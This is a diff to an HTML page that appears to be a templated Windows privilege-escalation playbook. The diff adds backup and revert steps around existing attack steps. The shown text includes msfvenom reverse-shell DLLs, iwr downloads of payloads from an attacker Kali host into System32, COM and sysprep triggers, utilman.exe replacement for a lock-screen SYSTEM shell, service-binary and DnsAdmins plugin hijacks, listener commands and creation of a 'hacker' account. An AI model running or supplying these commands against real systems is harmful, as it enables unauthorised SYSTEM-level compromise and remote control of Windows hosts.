@@ -1592,6 +1592,13 @@ REM The BITS service calls WinRM on 5985 at startup → connects to your fake li
             </div>
           </div>
           <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">copy "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll" "{{WPATH}}\PrintConfig.dll.bak" 2>nul & echo [BAK] Saved original PrintConfig.dll</div>
+            </div>
+          </div>
+          <div class="step">
             <div class="step-num">6</div>
             <div class="step-content">
               <div class="step-title">Drop the DLL to exact PrintNotify path (now writable after step 3)</div>
@@ -1605,6 +1612,14 @@ REM The BITS service calls WinRM on 5985 at startup → connects to your fake li
               <div class="code-block purple">$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
 $object = [Activator]::CreateInstance($type)
 # Shell arrives on Kali listener as SYSTEM</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">REM If original existed: restore it. If it was a ghost DLL (didn't exist): delete your payload.
+copy /Y "{{WPATH}}\PrintConfig.dll.bak" "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll" 2>nul || del /F /Q "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</div>
             </div>
           </div>
           <div class="alert alert-red">
@@ -1649,6 +1664,15 @@ systeminfo</div>
   -f dll -o AddUser.dll
 python3 -m http.server {{PORT}}</div>
           </div></div>
+          <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">REM Backup whichever path you will use:
+copy "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll" "{{WPATH}}\PrintConfig.dll.bak" 2>nul & echo [BAK] PrintConfig backup done
+copy "C:\Windows\System32\wbem\tzres.dll" "{{WPATH}}\tzres.dll.bak" 2>nul & echo [BAK] tzres backup done</div>
+            </div>
+          </div>
           <div class="step"><div class="step-num">2</div><div class="step-content">
             <div class="step-title">Windows — download and place as PrintConfig.dll or tzres.dll</div>
             <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/AddUser.dll -OutFile "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"
@@ -1663,6 +1687,15 @@ $object = [Activator]::CreateInstance($type)
 # For tzres.dll path:
 systeminfo</div>
           </div></div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">REM Restore whichever DLL you replaced:
+copy /Y "{{WPATH}}\PrintConfig.dll.bak" "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll" 2>nul || del /F /Q "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"
+copy /Y "{{WPATH}}\tzres.dll.bak" "C:\Windows\System32\wbem\tzres.dll" 2>nul || del /F /Q "C:\Windows\System32\wbem\tzres.dll"</div>
+            </div>
+          </div>
           <div class="step"><div class="step-num">4</div><div class="step-content">
             <div class="step-title">Windows — verify user created</div>
             <div class="code-block">net user hacker
@@ -1687,6 +1720,13 @@ impacket-psexec hacker:'P@ss123!'@{{TARGET}}</div>
             <div class="code-block purple">msfvenom -p windows/x64/shell_reverse_tcp LHOST={{KALI_IP}} LPORT={{RPORT}} -f dll -o tzres.dll
 python3 -m http.server {{PORT}}</div>
           </div></div>
+          <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">copy "C:\Windows\System32\wbem\tzres.dll" "{{WPATH}}\tzres.dll.bak" 2>nul & echo [BAK] tzres.dll backup saved (file may not exist on all builds)</div>
+            </div>
+          </div>
           <div class="step"><div class="step-num">2</div><div class="step-content">
             <div class="step-title">Windows — place tzres.dll (C:\ is already writable from exploit step)</div>
             <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/tzres.dll -OutFile "C:\Windows\System32\wbem\tzres.dll"
@@ -1702,6 +1742,13 @@ Get-Item "C:\Windows\System32\wbem\tzres.dll" | Select-Object Length,LastWriteTi
             <div class="code-block purple">systeminfo
 # Shell arrives on msfconsole as NT AUTHORITY\SYSTEM</div>
           </div></div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">copy /Y "{{WPATH}}\tzres.dll.bak" "C:\Windows\System32\wbem\tzres.dll" 2>nul || del /F /Q "C:\Windows\System32\wbem\tzres.dll"</div>
+            </div>
+          </div>
         </div>
       </div>
 
@@ -1719,6 +1766,14 @@ python3 -m http.server {{PORT}}</div>
             <div class="step-title">Kali &mdash; start reverse shell handler first (DLL may trigger immediately on drop)</div>
             <div class="code-block green">msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT {{RPORT}}; run"</div>
           </div></div>
+          <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">copy "C:\Windows\System32\wbemcomn.dll" "{{WPATH}}\wbemcomn.dll.bak" & echo [BAK] wbemcomn.dll backup saved
+REM NOTE: wbemcomn.dll ALWAYS exists — this is a real system file. Backup is MANDATORY.</div>
+            </div>
+          </div>
           <div class="step"><div class="step-num">3</div><div class="step-content">
             <div class="step-title">Windows &mdash; drop the DLL into System32 (requires C:\ write from SeManageVolumeExploit)</div>
             <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/wbemcomn.dll -OutFile "C:\Windows\System32\wbemcomn.dll"</div>
@@ -1732,6 +1787,14 @@ Get-WmiObject Win32_OperatingSystem
 REM Or restart the WMI service (requires sc rights):
 sc.exe stop winmgmt &amp;&amp; sc.exe start winmgmt</div>
           </div></div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">copy /Y "{{WPATH}}\wbemcomn.dll.bak" "C:\Windows\System32\wbemcomn.dll"
+REM Then restart WMI: sc stop winmgmt && sc start winmgmt</div>
+            </div>
+          </div>
         </div>
       </div>
 
@@ -1772,6 +1835,13 @@ EOF</div>
 x86_64-w64-mingw32-gcc -shared -o tzres.dll /tmp/evil.c -lws2_32
 python3 -m http.server {{PORT}}</div>
           </div></div>
+          <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">copy "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll" "{{WPATH}}\PrintConfig.dll.bak" 2>nul & echo [BAK] Saved original PrintConfig.dll</div>
+            </div>
+          </div>
           <div class="step"><div class="step-num">3</div><div class="step-content">
             <div class="step-title">Windows — upload nc64.exe first (if using shell variant), then DLL</div>
             <div class="code-block purple">iwr http://{{KALI_IP}}:{{PORT}}/windows/nc64.exe -o C:\Users\Public\Documents\nc64.exe
@@ -1786,6 +1856,13 @@ iwr http://{{KALI_IP}}:{{PORT}}/PrintConfig.dll -OutFile "C:\Windows\System32\sp
             <div class="code-block purple">$type = [Type]::GetTypeFromCLSID("{854A20FB-2D44-457D-992F-EF13785D2B51}")
 $object = [Activator]::CreateInstance($type)</div>
           </div></div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">copy /Y "{{WPATH}}\PrintConfig.dll.bak" "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll" 2>nul || del /F /Q "C:\Windows\System32\spool\drivers\x64\3\PrintConfig.dll"</div>
+            </div>
+          </div>
         </div>
       </div>
 
@@ -2284,10 +2361,26 @@ nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">.\SeRestoreAbuse.exe "cmd /c copy C:\Windows\System32\utilman.exe C:\Temp\utilman.exe.bak"
+REM Backup utilman.exe using SeRestoreAbuse itself (bypass ACL for the backup too)</div>
+            </div>
+          </div>
+          <div class="step">
             <div class="step-num">4</div>
             <div class="step-content">
               <div class="step-title">Alternative: stage payload from SMB share first</div>
               <div class="code-block">.\SeRestoreAbuse.exe "cmd /c copy \\{{KALI_IP}}\share\shell.exe C:\Windows\System32\utilman.exe"</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">.\SeRestoreAbuse.exe "cmd /c copy /Y C:\Temp\utilman.exe.bak C:\Windows\System32\utilman.exe"
+REM Restores original Ease of Access utility</div>
             </div>
           </div>
           <div class="alert alert-teal">
@@ -2306,6 +2399,14 @@ nc -lvnp {{RPORT}}</div>
             <span>Replaces utilman.exe (Ease of Access) with cmd.exe. On the RDP lock screen, pressing <strong>Win+U</strong> spawns a SYSTEM cmd instead of Ease of Access. Requires an active RDP session to the target.</span>
           </div>
           <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">.\SeRestoreAbuse.exe "cmd /c copy C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.exe.bak"
+REM Creates utilman.exe.bak in System32 — used by the REVERT step below</div>
+            </div>
+          </div>
+          <div class="step">
             <div class="step-num">1</div>
             <div class="step-content">
               <div class="step-title">Overwrite utilman.exe with cmd.exe via SeRestoreAbuse</div>
@@ -2322,10 +2423,10 @@ nc -lvnp {{RPORT}}</div>
             </div>
           </div>
           <div class="step">
-            <div class="step-num">3</div>
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
             <div class="step-content">
-              <div class="step-title">Opsec: restore utilman.exe after use</div>
-              <div class="code-block orange">.\SeRestoreAbuse.exe "cmd /c copy C:\Windows\System32\utilman.exe.old C:\Windows\System32\utilman.exe"</div>
+              <div class="step-title">↩ REVERT — restore utilman.exe after exploitation</div>
+              <div class="code-block orange">.\SeRestoreAbuse.exe "cmd /c copy /Y C:\Windows\System32\utilman.exe.bak C:\Windows\System32\utilman.exe"</div>
             </div>
           </div>
         </div>
@@ -2345,6 +2446,14 @@ nc -lvnp {{RPORT}}</div>
               <div class="step-title">Identify a stoppable service running as SYSTEM</div>
               <div class="code-block">sc qc VulnService
 # Check: SERVICE_START_NAME = LocalSystem, BINARY_PATH_NAME = writable path</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">.\SeRestoreAbuse.exe "cmd /c copy \"C:\Program Files\VulnService\service.exe\" {{WPATH}}\service.exe.bak"
+REM Backs up the original service binary before overwriting</div>
             </div>
           </div>
           <div class="step">
@@ -2368,6 +2477,16 @@ nc -lvnp {{RPORT}}</div>
             <div class="step-content">
               <div class="step-title">Start the service to trigger payload execution</div>
               <div class="code-block green">sc start VulnService</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">sc stop VulnService
+.\SeRestoreAbuse.exe "cmd /c copy /Y {{WPATH}}\service.exe.bak \"C:\Program Files\VulnService\service.exe\""
+sc start VulnService
+REM Service restored to original binary</div>
             </div>
           </div>
         </div>
@@ -2409,10 +2528,10 @@ nc -lvnp {{RPORT}}</div>
             <div class="flow-node">SYSTEM shell</div>
           </div>
           <div class="step">
-            <div class="step-num">1</div>
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
             <div class="step-content">
-              <div class="step-title">Backup original file first</div>
-              <div class="code-block">copy C:\Windows\System32\utilman.exe C:\Temp\utilman.exe.bak</div>
+              <div class="step-title">💾 BACKUP — run BEFORE placing the payload</div>
+              <div class="code-block orange">copy C:\Windows\System32\utilman.exe C:\Temp\utilman.exe.bak</div>
             </div>
           </div>
           <div class="step">
@@ -2442,6 +2561,14 @@ nc -lvnp {{RPORT}}</div>
               <div class="step-title">Trigger: RDP → lock screen → press Win+U</div>
               <div class="code-block"># On RDP session: lock screen (Win+L), then click Ease of Access (Win+U)
 # You get a SYSTEM cmd.exe prompt without logging in</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">copy /Y C:\Temp\utilman.exe.bak C:\Windows\System32\utilman.exe
+REM Restores original Ease of Access binary (run this after getting SYSTEM shell)</div>
             </div>
           </div>
         </div>
@@ -2519,10 +2646,10 @@ REM Target a stopped or restartable service</div>
             </div>
           </div>
           <div class="step">
-            <div class="step-num">2</div>
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
             <div class="step-content">
-              <div class="step-title">Backup and take ownership of the service binary</div>
-              <div class="code-block">copy "C:\Program Files\VulnSvc\svc.exe" C:\Temp\svc.exe.bak
+              <div class="step-title">💾 BACKUP — run BEFORE replacing the service binary</div>
+              <div class="code-block orange">copy "C:\Program Files\VulnSvc\svc.exe" C:\Temp\svc.exe.bak
 takeown /f "C:\Program Files\VulnSvc\svc.exe"
 icacls "C:\Program Files\VulnSvc\svc.exe" /grant "%USERNAME%":F</div>
             </div>
@@ -2549,6 +2676,16 @@ REM On target:
 sc stop VulnSvc
 sc start VulnSvc
 REM Shell arrives as SYSTEM</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">sc stop VulnSvc
+copy /Y "C:\Temp\svc.exe.bak" "C:\Program Files\VulnSvc\svc.exe"
+sc start VulnSvc
+REM Original service binary restored</div>
             </div>
           </div>
         </div>
@@ -3140,6 +3277,16 @@ msfvenom -p windows/x64/exec CMD="net user hacker P@ssw0rd1 /add &amp;&amp; net 
             </div>
           </div>
           <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">copy "C:\Windows\System32\Sysprep\cryptbase.dll" "{{WPATH}}\cryptbase.dll.bak" 2>nul & echo [BAK] cryptbase.dll backup (may not exist - that is OK)
+REM Also backup alternative DLL names if you plan to try them:
+REM copy "C:\Windows\System32\Sysprep\actionqueue.dll" "{{WPATH}}\actionqueue.dll.bak" 2>nul
+REM copy "C:\Windows\System32\Sysprep\dbgcore.dll" "{{WPATH}}\dbgcore.dll.bak" 2>nul</div>
+            </div>
+          </div>
+          <div class="step">
             <div class="step-num">2</div>
             <div class="step-content">
               <div class="step-title">Transfer DLL to target sysprep directory</div>
@@ -3160,6 +3307,14 @@ REM Also try: actionqueue.dll, dbgcore.dll, mscoree.dll (all loaded by sysprep.e
               <div class="step-title">Trigger: run sysprep.exe (auto-elevates to SYSTEM and loads your DLL)</div>
               <div class="code-block green">C:\Windows\System32\Sysprep\sysprep.exe
 REM Shell arrives as SYSTEM on listener</div>
+            </div>
+          </div>
+          <div class="step">
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
+            <div class="step-content">
+              <div class="step-title">↩ REVERT — one-liner restore (run after exploitation)</div>
+              <div class="code-block orange">REM Restore: if original existed, put it back; if it was a ghost DLL, delete payload
+copy /Y "{{WPATH}}\cryptbase.dll.bak" "C:\Windows\System32\Sysprep\cryptbase.dll" 2>nul || del /F /Q "C:\Windows\System32\Sysprep\cryptbase.dll"</div>
             </div>
           </div>
           <div class="alert alert-teal">
@@ -3520,6 +3675,17 @@ REM -smb2support is REQUIRED for Windows 10 / Server 2016+ (SMB1 is disabled by 
             </div>
           </div>
           <div class="step">
+            <div class="step-num" style="background:var(--orange);font-size:11px;">BAK</div>
+            <div class="step-content">
+              <div class="step-title">💾 BACKUP — run this BEFORE placing the payload</div>
+              <div class="code-block orange">REM Check if ServerLevelPluginDll already has a value (save it before overwriting):
+reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll 2>nul && (
+  reg export HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters {{WPATH}}\dns_params_backup.reg /y
+  echo [BAK] Existing DNS params backed up to {{WPATH}}\dns_params_backup.reg
+) || echo [INFO] ServerLevelPluginDll did not exist - delete the key to revert</div>
+            </div>
+          </div>
+          <div class="step">
             <div class="step-num">5</div>
             <div class="step-content">
               <div class="step-title">Configure DNS server plugin DLL via dnscmd (MUST include DC hostname)</div>
@@ -3552,9 +3718,9 @@ sc start dns
             </div>
           </div>
           <div class="step">
-            <div class="step-num">7</div>
+            <div class="step-num" style="background:var(--accent);font-size:11px;">↩</div>
             <div class="step-content">
-              <div class="step-title">Cleanup — remove the plugin DLL setting after exploitation</div>
+              <div class="step-title">↩ REVERT — remove plugin DLL registry key + restart DNS cleanly</div>
               <div class="code-block">dnscmd dc01 /config /serverlevelplugindll ""
 sc stop dns
 sc start dns
